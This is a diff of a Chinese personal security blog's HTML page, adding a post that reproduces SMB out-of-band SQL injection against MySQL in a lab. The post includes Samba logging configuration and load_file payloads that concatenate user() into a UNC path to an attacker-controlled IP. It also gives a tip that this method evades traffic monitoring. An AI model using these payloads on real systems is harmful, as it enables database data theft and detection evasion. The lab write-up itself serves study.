@@ -5,8 +5,6 @@
   <!-- SEO相关 -->
   
     
-      <meta name="robots" content="noindex,follow">
-    
   
   <!-- 渲染优化 -->
   <meta http-equiv='x-dns-prefetch-control' content='on' />
@@ -24,9 +22,13 @@
 
   <!-- 页面元数据 -->
   
-  <title>归档 - 我的小blog</title>
+  <title>smb带外注入复现 - 我的小blog</title>
+  
+    <meta name="keywords" content="smb">
   
 
+  
+    <meta name="description" content="smb带外注入">
   
 
   <!-- feed -->
@@ -106,7 +108,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <body>
     
 
-<header id="l_header" class="l_header auto shadow " style='opacity: 0' >
+<header id="l_header" class="l_header auto shadow show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -231,7 +233,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="half" class='cover-wrapper  dock' style="display: ;">
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture"></div>
           
@@ -317,111 +319,229 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 
 <div class='l_main'>
-	
-	  <article id="arc" class="post article white-box reveal shadow">
-			
-			
-				
-				
-					
-						
-						<h2>2021</h2>
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/">
-									<time>06-27</time>
-									
-										smb带外注入复现
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/06/25/mssql/">
-									<time>06-25</time>
-									
-										mssql注入突破堆叠来执行命令
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/06/25/sqlserver/">
-									<time>06-25</time>
-									
-										sqlserver注入:执行命令和写入exe的一些方法技巧
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/06/23/oracle/">
-									<time>06-23</time>
-									
-										oracle注入
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/06/23/20210623%E6%97%A5%E8%AE%B0/">
-									<time>06-23</time>
-									
-										日记-20210623
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-				
-				
-					
-						<div class='timenode'>
-								<a class="meta" href="/2021/06/22/%E5%88%9D%E6%AC%A1%E8%A7%81%E9%9D%A2/">
-									<time>06-22</time>
-									
-										初次见面
-									
-									
-									
-									
-								</a>
-						</div>
-				
-			
-	  </article>
-	
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        smb带外注入复现
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>gun97</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2021年6月27日</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="smb带外注入复现" data-path="/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  
+  <h1 id="smb带外注入"><a href="#smb带外注入" class="headerlink" title="smb带外注入"></a>smb带外注入</h1><h2 id="1-测试环境"><a href="#1-测试环境" class="headerlink" title="1 测试环境"></a>1 测试环境</h2><p> centos7 mysql</p>
+<p>CentOS7上安装smb服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install samba</span><br></pre></td></tr></table></figure>
+
+<p>然后修改smb配置文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/samba/smb.conf</span><br></pre></td></tr></table></figure>
+<p>修改为如下图：<br><img src="/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/16247944406236.jpg" class="lazyload" data-srcset="/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/16247944406236.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="><br><img src="/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/16247947230451.jpg" class="lazyload" data-srcset="/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/16247947230451.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">旧版本将user 改为share，这里我用的新版本，需要在后面添加：</span><br><span class="line"></span><br><span class="line">map to guest = Bad User</span><br><span class="line">    日志记录级别调到10 ，level 0-10 ，调到最高便于记录：   </span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span> level = 10</span><br><span class="line"><span class="built_in">log</span> file = /var/<span class="built_in">log</span>/samba/%m.log //这里配置每个连接的用户独立生成一个<span class="built_in">log</span>文件</span><br><span class="line">    然后再配置一个<span class="built_in">test</span>共享：</span><br><span class="line"></span><br><span class="line">[<span class="built_in">test</span>]</span><br><span class="line">        comment = Public stuff</span><br><span class="line">        path = /usr/<span class="built_in">local</span>/<span class="built_in">test</span></span><br><span class="line">        public = yes</span><br><span class="line">        browseable = yes</span><br><span class="line">        guest ok = yes</span><br><span class="line">保存后重启 samba服务。</span><br></pre></td></tr></table></figure>
+<p>然后找一台windows环境的机器，上面安装MySQL ，设置读写权限：secure_file_priv=’’。</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>在MySQL服务器上执行这样一条SQL语句：会生成一个对应的log文件：路径：<code>/var/log/samba/</code></p>
+<p><code>select load_file(&#39;\\\\192.168.31.243\\smb_test\\1.txt&#39;);</code><br><img src="/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/16247949522808.jpg" class="lazyload" data-srcset="/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/16247949522808.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="><br>在samba服务器查看到了这样一条日志：<br>smbd_smb2_tree_connect: couldn’t find service smb_test<br>[2021/06/27 19:19:37.229364,  3, pid=13522, effective(0, 0), real(0, 0), class=smb2] ../../source3/smbd/smb2_server.c:3213(smbd_smb2_request_error_ex)<br><img src="/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/16247954626153.jpg" class="lazyload" data-srcset="/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/16247954626153.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
+<p>如果执行的共享目录存在于服务器上：<br><code>select load_file(&#39;\\\\192.168.31.243\\test\\smb_test\\1.txt&#39;);</code><br>会得到这样的日志:<br>check_reduced_name: check_reduced_name [smb_test.sym] [/usr/local/test]<br>[2021/06/27 19:33:03.723316, 10, pid=13550, effective(99, 99), real(99, 0), class=vfs] ../../source3/smbd/vfs.c:1257(check_reduced_name)<br><img src="/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/16247957916385.jpg" class="lazyload" data-srcset="/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/16247957916385.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
+<p>然后使用两种方法都可以。</p>
+<p>这里使用第一种方法来查询一下user():<br><code>select load_file(concat(&#39;\\\\192.168.31.243\\&#39;,user(),&#39;\\1.txt&#39;));</code><br>查看日志获取数据：<br>smbd_smb2_tree_connect: couldn’t find service root@localhost<br><img src="/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/16247961031859.jpg" class="lazyload" data-srcset="/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/16247961031859.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
+<p>可以收到查询的内容了。 经过测试第二种方法会比第一种快，推荐第一种。</p>
+<p>日志内容比较多，不便于查找，日志还需要进一步优化。不过，我们可以插入关键词进行匹配：</p>
+<p><code>select load_file(concat(&#39;\\\\192.168.31.243\\test\\[asd&#39;,user(),&#39;asd]\\1.txt&#39;));</code></p>
+<p>查看日志：<br>open_file_ntcreate: fname=[asdroot@localhostasd].sym, dos_attrs=0x80 access_mask=0x120089 share_access=0x7 create_disposition = 0x1 create_options=0x40 unix mode=0744 oplock_request=256 private_flags = 0x0<br><img src="/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/16247965560647.jpg" class="lazyload" data-srcset="/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/16247965560647.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p>
+<h2 id="最后，来比较一下smb外带注入与DNS外带注入。"><a href="#最后，来比较一下smb外带注入与DNS外带注入。" class="headerlink" title="最后，来比较一下smb外带注入与DNS外带注入。"></a>最后，来比较一下smb外带注入与DNS外带注入。</h2><ol>
+<li><p>smb外带注入 可以一次性提交更大长度的字符，经测试长度在120是没有问题的，而dns前缀最多是63个字符。而且对特殊字符的兼容性比较好，目前测试发现 *是不行的，其他还有待fuzz。</p>
+</li>
+<li><p>smb外带注入不依赖于dns，可以绕过目前流量监测设备对异常域名前缀的捕获，可以直接使用ip，不需要dns请求。</p>
+</li>
+<li><p>二者都受限于windows系统以及MySQL 的secure_file_priv 。</p>
+</li>
+</ol>
+
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=http://example.com/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/>http://example.com/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-06-27T20:22:55+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2021年6月27日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>smb带外注入</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E6%B3%A8%E5%85%A5/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>注入</p></a></div>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/&title=smb带外注入复现 - 我的小blog&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/&title=smb带外注入复现 - 我的小blog&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2021/06/27/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/&title=smb带外注入复现 - 我的小blog&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2021/06/25/mssql/'>
+          <p class='title'>mssql注入突破堆叠来执行命令<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>1、利用openrowset，适用于union和报错注入： 但是该方法在实际的运用中局限性还是很大的，因为在 mssql2005 及其以后，mssql对系统存储过程做了权限控制，Ad Hoc D...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+
+
+
 </div>
 <aside class='l_side'>
   
@@ -429,131 +549,28 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/'>
-          <img no-lazy src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">我的小blog</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://gun97.github.io/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
 
-  
 
-  
-    
-    
-  
-
-  <section class="widget category shadow desktop">
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
     
   <header>
     
-      <a href='categories/'><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
     
   </header>
 
 
     <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/web%E5%AE%89%E5%85%A8/" href="/categories/web%E5%AE%89%E5%85%A8/"
-            id="categorieswebE5AE89E585A8"
-            ><div class='name'>web安全</div><div class='badge'>(4)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/%E6%97%A5%E8%AE%B0/" href="/categories/%E6%97%A5%E8%AE%B0/"
-            id="categoriesE697A5E8AEB0"
-            ><div class='name'>日记</div><div class='badge'>(1)</div></a></li>
-        
-      </ul>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="toc-text">1 测试环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-text">复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%EF%BC%8C%E6%9D%A5%E6%AF%94%E8%BE%83%E4%B8%80%E4%B8%8Bsmb%E5%A4%96%E5%B8%A6%E6%B3%A8%E5%85%A5%E4%B8%8EDNS%E5%A4%96%E5%B8%A6%E6%B3%A8%E5%85%A5%E3%80%82"><span class="toc-text">最后，来比较一下smb外带注入与DNS外带注入。</span></a></li></ol>
     </div>
   </section>
 
-
-  
-
-  
-    
-    
-  
-
-  <section class="widget tagcloud shadow desktop mobile">
-    
-  <header>
-    
-      <a href='tags/'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/mssql%E6%B3%A8%E5%85%A5/" style="font-size: 14px; color: #999">mssql注入</a> <a href="/tags/smb%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5/" style="font-size: 14px; color: #999">smb带外注入</a> <a href="/tags/sqlserver%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/" style="font-size: 14px; color: #999">sqlserver注入执行命令</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 14px; color: #999">sql注入</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 14px; color: #999">web安全</a> <a href="/tags/%E6%8A%80%E6%9C%AF/" style="font-size: 14px; color: #999">技术</a> <a href="/tags/%E6%97%A5%E8%AE%B0/" style="font-size: 14px; color: #999">日记</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size: 14px; color: #999">注入</a>
-    </div>
-  </section>
-
-
-  
 
   
 
 
 </aside>
+
 
 
 		  
@@ -562,21 +579,21 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
-  pdata.postTitle="";
+  pdata.ispage=true;
+  pdata.postTitle="smb带外注入复现";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   // header 这里无论是否开启pjax都需要
   var l_header=document.getElementById("l_header");
   
-  l_header.classList.remove("show");
+  l_header.classList.add("show");
   
   
     // cover
     var cover_wrapper=document.querySelector('.cover-wrapper');
     
-    cover_wrapper.id="half";
-    cover_wrapper.style.display="";
+    cover_wrapper.id="none";
+    cover_wrapper.style.display="none";
     
   
 </script>
